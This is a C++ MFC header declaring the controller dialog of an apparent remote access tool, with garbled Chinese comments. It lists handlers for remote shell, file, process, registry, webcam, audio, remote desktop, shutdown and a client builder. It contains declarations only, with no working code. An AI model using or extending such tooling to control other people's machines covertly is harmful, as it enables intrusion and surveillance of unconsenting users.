
// ServerDlg.h : ͷ�ļ�
//

#pragma once
#include "afxcmn.h"

#include "TrueColorToolBar.h"
#include "IOCPServer.h"


// CServerDlg �Ի���
class CServerDlg : public CDialogEx
{
// ����
public:
	CServerDlg(CWnd* pParent = NULL);	// ��׼���캯��

	void DoDataExchange(CDataExchange * pDX);


// �Ի�������
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_SERVER_DIALOG };
#endif
	protected:
	//virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV ֧��
// ʵ��
protected:
	HICON m_hIcon;
	// ���ɵ���Ϣӳ�亯��
	virtual BOOL OnInitDialog();
	
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	afx_msg void OnIconNotify(WPARAM wParam, LPARAM lParam);
	
	DECLARE_MESSAGE_MAP()


	//��ʼ��ControlList�ؼ�
	VOID CServerDlg::InitListControl();
	VOID CServerDlg::InitSolidMenu();
	VOID CServerDlg::InitNotifyIconData();
	VOID CServerDlg::InitStatusBar();
	VOID CServerDlg::InitTrueToolBarMain();
	VOID Activate(int Port, int MaxConnections);                     //����ͨ������
	VOID WindowShowMessage(BOOL IsOk, CString Message);              //������ʾ����
private:
	CBitmap m_Bitmap[30];
	NOTIFYICONDATA      m_NotifyIconData;
	CListCtrl           m_CListCtrl_Server_Online;
	CListCtrl           m_CListCtrl_Server_Message;
	CStatusBar          m_StatusBar;
	CTrueColorToolBar   m_CTrueColorToolBar_Server_Main;
	int                 m_Count;
public:
	static VOID CALLBACK WindowNotifyProcedure(PCONTEXT_OBJECT ContextObject);
	static VOID CServerDlg::MessageHandleIO(CONTEXT_OBJECT* ContextObject);


	afx_msg void OnServerMainSet();
	afx_msg void OnServerMainExit();
	afx_msg void OnClose();
	afx_msg void OnNotifyicondataExit();
	afx_msg void OnNotifyicondataShow();
	afx_msg void OnSize(UINT nType, int cx, int cy);


	VOID CServerDlg::SendingSelectedCommand(PBYTE BufferData, ULONG BufferLength);

	//���Դ���
	afx_msg void OnServermainTestAddUser();
	
	
	
	//�û�����
	afx_msg LRESULT OnClientLogin(WPARAM wParam, LPARAM lParam);
	VOID CServerDlg::AddCtrlListServerOnline(CString ClientAddressData, CString ClientPosition, CString HostNameData,
		CString OSNameData, CString ProcessorNameStringData, CString IsWebCameraExist, CString WebSpeed, CONTEXT_OBJECT* ContextObject);


	//��ʱ��Ϣ
	afx_msg LRESULT OpenInstantMessageDialog(WPARAM wParam, LPARAM lParam);

	//�ն˹���
	afx_msg void OnServerCmdManager();
    afx_msg LRESULT OnOpenCmdManagerDialog(WPARAM wParam, LPARAM lParam);


	//���̹���
	afx_msg void OnServerProcessManager();
	afx_msg LRESULT OnOpenProcessManagerDialog(WPARAM wParam, LPARAM lParam);


	//���ڹ���
	afx_msg void OnServerWindowManager();
	afx_msg LRESULT OnOpenWindowManagerDialog(WPARAM wParam, LPARAM lParam);

	//Զ�̿���
	afx_msg void OnServerRemoteControll();
    afx_msg LRESULT OnOpenRemoteControllDialog(WPARAM wParam, LPARAM lParam);
	
	//�ļ�����
	afx_msg void OnServerFileManager();
	afx_msg LRESULT OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam);

	//��Ƶ����
	afx_msg void  OnServerAudioManager();
	afx_msg LRESULT OnOpenAudioManagerDialog(WPARAM wParam, LPARAM lParam);

	//��Ƶ����
	afx_msg void  OnServerVideoManager();
	afx_msg LRESULT OnOpenVideoManagerDialog(WPARAM wParam, LPARAM lParam);
	//�������
	afx_msg void  OnServerServiceManager();
	afx_msg LRESULT OnOpenServiceManagerDialog(WPARAM wParam, LPARAM lParam);

	//ע������
	afx_msg void OnServerRegisterManager();
	afx_msg LRESULT OnOpenRegisterManagerDialog(WPARAM wParam, LPARAM lParam);
	
	//���ɿͻ���
	afx_msg void OnServerCreateClient();
	afx_msg void OnNMRClickListServerOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnListserveronlinemainDelete();
	afx_msg void OnListserveronlinemainMessage();
	afx_msg void OnListserveronlinemainShutdown();
};
